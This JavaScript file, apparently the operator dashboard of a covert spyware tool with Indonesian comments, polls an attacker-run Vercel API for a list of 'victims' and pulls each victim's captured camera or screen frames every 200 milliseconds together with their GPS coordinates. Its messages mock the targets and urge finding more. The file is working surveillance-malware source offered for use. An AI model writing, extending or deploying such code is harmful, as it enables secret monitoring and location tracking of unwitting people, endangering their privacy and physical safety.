// viewer.js
    const VERCEL_VIEWER_API = 'https://[nama-project-lo].vercel.app/api'; // Ganti dengan URL Vercel lo!
    const victimListDiv = document.getElementById('victimList');
    const victimImage = document.getElementById('currentVictimImage');
    const victimInfoP = document.getElementById('victimInfo');
    let activeVictimId = null;
    let refreshInterval = null;

    async function fetchVictims() {
        try {
            const response = await fetch(`${VERCEL_VIEWER_API}/list-victims`);
            const data = await response.json();
            victimListDiv.innerHTML = '';
            if (data.victims && data.victims.length > 0) {
                data.victims.forEach(id => {
                    const button = document.createElement('button');
                    button.textContent = `Korban: ${id.substring(0, 8)}...`;
                    button.onclick = () => selectVictim(id);
                    if (id === activeVictimId) {
                        button.classList.add('active');
                    }
                    victimListDiv.appendChild(button);
                });
            } else {
                victimListDiv.innerHTML = '<p>Tidak ada korban aktif, sialan! Ayo cari lagi!</p>';
                victimImage.src = '';
                victimInfoP.textContent = '';
                if (refreshInterval) clearInterval(refreshInterval);
            }
        } catch (error) {
            console.error('Gagal daftar korban, bangsat:', error);
            victimListDiv.innerHTML = '<p>Gagal memuat daftar korban, anjing!</p>';
        }
    }

    async function selectVictim(id) {
        if (refreshInterval) {
            clearInterval(refreshInterval);
        }
        activeVictimId = id;
        // Update tombol yang aktif
        Array.from(victimListDiv.children).forEach(btn => {
            if (btn.tagName === 'BUTTON') {
                btn.classList.remove('active');
                if (btn.textContent.startsWith(`Korban: ${id.substring(0, 8)}`)) {
                    btn.classList.add('active');
                }
            }
        });

        fetchVictimFrame(); // Ambil frame pertama
        refreshInterval = setInterval(fetchVictimFrame, 200); // Ambil frame setiap 200ms
        console.log(`Mulai memantau korban ${id}, hahahaha!`);
    }

    async function fetchVictimFrame() {
        if (!activeVictimId) return;

        try {
            const response = await fetch(`${VERCEL_VIEWER_API}/get-frame?victimId=${activeVictimId}`);
            if (response.ok) {
                const data = await response.json();
                if (data.imageData) {
                    victimImage.src = data.imageData;
                    if (data.location) {
                        victimInfoP.textContent = `Lokasi: ${data.location.latitude}, ${data.location.longitude}`;
                    } else {
                        victimInfoP.textContent = 'Lokasi tidak tersedia.';
                    }
                }
            } else {
                victimImage.src = ''; // Kosongkan jika tidak ada frame
                victimInfoP.textContent = 'Frame tidak tersedia atau korban offline.';
                console.warn('Gagal ambil frame terbaru, korban mungkin kabur!');
            }
        } catch (error) {
            console.error('Error saat mengambil frame, sialan:', error);
            victimImage.src = '';
            victimInfoP.textContent = 'Error saat mengambil data.';
        }
    }

    // Refresh daftar korban setiap beberapa detik
    setInterval(fetchVictims, 5000);
    fetchVictims(); // Panggil pertama kali
